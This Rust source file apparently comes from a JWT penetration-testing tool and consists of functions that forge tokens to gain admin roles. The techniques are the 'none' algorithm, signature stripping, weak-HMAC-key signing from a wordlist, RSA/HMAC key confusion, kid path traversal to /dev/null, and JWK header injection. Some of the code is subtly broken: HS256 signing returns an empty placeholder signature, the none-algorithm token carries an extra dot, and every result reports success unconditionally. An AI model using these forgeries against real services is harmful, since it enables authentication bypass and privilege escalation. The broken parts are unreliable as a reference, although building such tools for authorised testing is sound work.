use std::collections::HashSet;

use crate::constants::JWT_COMMON;
use crate::{error::JWTAnalyzerError, JWTExploiter};
use crate::types::ExploitResult;
use rand::rngs::OsRng;
use serde_json::{from_slice, json, Value};
use base64::{encode_config, URL_SAFE_NO_PAD};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use rsa::{pkcs1::EncodeRsaPublicKey, RsaPrivateKey, RsaPublicKey, traits::PublicKeyParts};
use rsa::pkcs1v15::SigningKey;
use signature::{Signer, SignatureEncoding};

pub trait JsonValueExt {
    fn remove(&mut self, key: &str) -> Option<serde_json::Value>;
}

impl JsonValueExt for serde_json::Value {
    fn remove(&mut self, key: &str) -> Option<serde_json::Value> {
        match self {
            serde_json::Value::Object(map) => map.remove(key),
            _ => None,
        }
    }
}

impl JWTExploiter {

    fn sign_token(&self, payload: &serde_json::Value) -> Result<String, JWTAnalyzerError> {
        // Use the existing header from the struct instead of creating new one
        let header_b64 = encode_config(
            serde_json::to_string(&self.header)
                .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );

        let payload_b64 = encode_config(
            serde_json::to_string(payload)
                .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );

        // Extract algorithm from the header
        let alg = self.header.get("alg")
            .and_then(|a| a.as_str())
            .ok_or_else(|| JWTAnalyzerError::HeaderParsing("Missing or invalid 'alg' claim".to_string()))?;

        // Create signature based on algorithm from header
        let signature = match alg {
            "HS256" => {
                // Note: You might need to store the secret key somewhere in your struct
                // or pass it as a parameter if needed
                String::new() // Placeholder - implement actual signing if needed
            },
            "RS256" => {
                return Err(JWTAnalyzerError::SigningError("RS256 not implemented".to_string()));
            },
            "none" => String::new(),
            _ => return Err(JWTAnalyzerError::SigningError(format!("Unsupported algorithm: {}", alg))),
        };

        Ok(format!("{}.{}.{}", header_b64, payload_b64, signature))
    }

    pub async fn forge_expired_token(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        // Set expiration time to a future date
        payload["exp"] = json!(chrono::Utc::now().timestamp() + 31536000); // 1 year in future
        
        let forged_token = self.sign_token(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?;

        Ok(ExploitResult {
            forged_token,
            technique: "Expiration Manipulation".to_string(),
            description: "Extended token lifetime by manipulating exp claim".to_string(),
            success: true,
        })
    }

    pub async fn forge_blank_password(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        // Remove password hash or set to empty if exists
        if payload.get("pwd").is_some() {
            payload["pwd"] = json!("");
        }
        
        let forged_token = self.sign_token(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?;

        Ok(ExploitResult {
            forged_token,
            technique: "Blank Password".to_string(),
            description: "Modified token to contain empty password field".to_string(),
            success: true,
        })
    }

    // Low Severity Findings
    pub async fn forge_missing_claims(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
    
        // Get the existing claims in the token
        let token_parts: Vec<&str> = self.original_token.split('.').collect();
        let decoded_payload = base64::decode(&token_parts[1])
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?;
        let token_claims: HashSet<String> = from_slice::<Value>(&decoded_payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?
            .as_object()
            .map(|obj| obj.keys().cloned().collect())
            .unwrap_or_default();
    
        // Check for and remove recommended claims only if they exist in the token
        let mut removed_claims: HashSet<&'static str> = HashSet::new();
        if token_claims.contains("iat") {
            payload.remove("iat");
            removed_claims.insert("iat");
        }
        if token_claims.contains("nbf") {
            payload.remove("nbf");
            removed_claims.insert("nbf");
        }
        if token_claims.contains("jti") {
            payload.remove("jti");
            removed_claims.insert("jti");
        }
    
        // Create an exploit result if any claims were removed
        let forged_token = self.sign_token(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?;
    
        let technique = format!(
            "Missing Claims: {}",
            removed_claims.iter().cloned().collect::<Vec<_>>().join(", ")
        );
        let description = format!(
            "Removed recommended security claims ({}) from token",
            removed_claims.iter().cloned().collect::<Vec<_>>().join(", ")
        );
    
        Ok(ExploitResult {
            forged_token,
            technique,
            description,
            success: !removed_claims.is_empty(),
        })
    }
    

    pub async fn forge_algorithm_case(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let parts: Vec<&str> = self.original_token.split('.').collect();
        if parts.len() != 3 {
            return Err(JWTAnalyzerError::InvalidFormat);
        }

        let mut header: serde_json::Value = serde_json::from_slice(
            &base64::decode_config(parts[0], base64::URL_SAFE_NO_PAD)
                .map_err(|e| JWTAnalyzerError::HeaderDecoding(e.to_string()))?
        ).map_err(|e| JWTAnalyzerError::HeaderParsing(e.to_string()))?;

        // Modify algorithm case
        if let Some(alg) = header.get("alg").and_then(|a| a.as_str()) {
            header["alg"] = json!(alg.to_uppercase());
        }

        let header_b64 = encode_config(
            serde_json::to_string(&header)
                .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );

        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, parts[1], parts[2]),
            technique: "Algorithm Case Manipulation".to_string(),
            description: "Modified algorithm case to test case sensitivity handling".to_string(),
            success: true,
        })
    }

    pub async fn forge_large_payload(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        // Add large amount of data
        payload["padding"] = json!("A".repeat(50000));
        
        let forged_token = self.sign_token(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?;

        Ok(ExploitResult {
            forged_token,
            technique: "Large Payload".to_string(),
            description: "Created token with excessive payload size".to_string(),
            success: true,
        })
    }

    pub async fn forge_none_algorithm(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "none"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}..", header_b64, payload_b64),
            technique: "Algorithm None".to_string(),
            description: "Forged token using 'none' algorithm bypass".to_string(),
            success: true,
        })
    }

    pub async fn forge_stripped_signature(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let parts: Vec<&str> = self.original_token.split('.').collect();
        if parts.len() != 3 {
            return Err(JWTAnalyzerError::InvalidFormat);
        }

        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.", parts[0], payload_b64),
            technique: "Signature Stripping".to_string(),
            description: "Forged token by stripping signature and modifying payload".to_string(),
            success: true,
        })
    }

    pub async fn forge_with_weak_key(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        // Read weak keys from the embedded file, split by newlines and filter empty lines
        let weak_keys: Vec<&str> = JWT_COMMON
            .lines()
            .filter(|line| !line.trim().is_empty())
            .collect();
    
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);
    
        // Try each weak key from the embedded list
        for key in weak_keys {
            let header = json!({
                "typ": "JWT",
                "alg": "HS256"
            });
    
            let header_b64 = encode_config(
                serde_json::to_string(&header)
                    .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?
                    .as_bytes(), 
                URL_SAFE_NO_PAD
            );
            
            let payload_b64 = encode_config(
                serde_json::to_string(&payload)
                    .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?
                    .as_bytes(), 
                URL_SAFE_NO_PAD
            );
    
            let message = format!("{}.{}", header_b64, payload_b64);
            
            // Try to create HMAC with the current weak key
            if let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(key.as_bytes()) {
                mac.update(message.as_bytes());
                let signature = mac.finalize().into_bytes();
                let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);
    
                return Ok(ExploitResult {
                    forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
                    technique: "Weak HMAC Key".to_string(),
                    description: format!("Forged token using common weak HMAC key: {}", key),
                    success: true,
                });
            }
        }
    
        Err(JWTAnalyzerError::SignatureVerification)
    }

    pub async fn forge_key_confusion(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 2048)
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to generate RSA key".into()))?;
        let public_key = RsaPublicKey::from(&private_key);

        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "HS256",
            "kid": "public-key-1"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        let pub_key_der = public_key.to_pkcs1_der()
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to encode public key".into()))?;

        let message = format!("{}.{}", header_b64, payload_b64);
        let mut mac = Hmac::<Sha256>::new_from_slice(pub_key_der.as_bytes())
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;
        mac.update(message.as_bytes());
        let signature = mac.finalize().into_bytes();
        let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "Key Confusion Attack".to_string(),
            description: "Forged token using RSA/HMAC key confusion vulnerability".to_string(),
            success: true,
        })
    }

    pub async fn forge_kid_injection(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "HS256",
            "kid": "../../../../../../dev/null"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        let message = format!("{}.{}", header_b64, payload_b64);
        let mut mac = Hmac::<Sha256>::new_from_slice(&[0u8; 32])
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;
        mac.update(message.as_bytes());
        let signature = mac.finalize().into_bytes();
        let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "KID Injection".to_string(),
            description: "Forged token using KID header injection with path traversal".to_string(),
            success: true,
        })
    }

    pub async fn forge_jwk_injection(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 2048)
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to generate RSA key".into()))?;
        let public_key = RsaPublicKey::from(&private_key);
        
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);
        
        let jwk = json!({
            "kty": "RSA",
            "kid": "attacker-key-1",
            "use": "sig",
            "n": base64::encode(public_key.n().to_bytes_be()),
            "e": base64::encode(public_key.e().to_bytes_be())
        });
        
        let header = json!({
            "typ": "JWT",
            "alg": "RS256",
            "jwk": jwk
        });
    
        let header_b64 = encode_config(
            serde_json::to_string(&header)
                .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );
        
        let payload_b64 = encode_config(
            serde_json::to_string(&payload)
                .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );
        
        let message = format!("{}.{}", header_b64, payload_b64);

        // Updated signing code
        let signing_key = SigningKey::<Sha256>::try_from(private_key)
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;

        // The sign method returns a Signature directly, no need for map_err here
        let signature = signing_key.sign(message.as_bytes());

        // Convert the signature to bytes and encode
        let signature_b64 = encode_config(signature.to_bytes(), URL_SAFE_NO_PAD);
        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "JWK Injection".to_string(),
            description: "Forged token by injecting attacker's JWK into header".to_string(),
            success: true,
        })
    }

}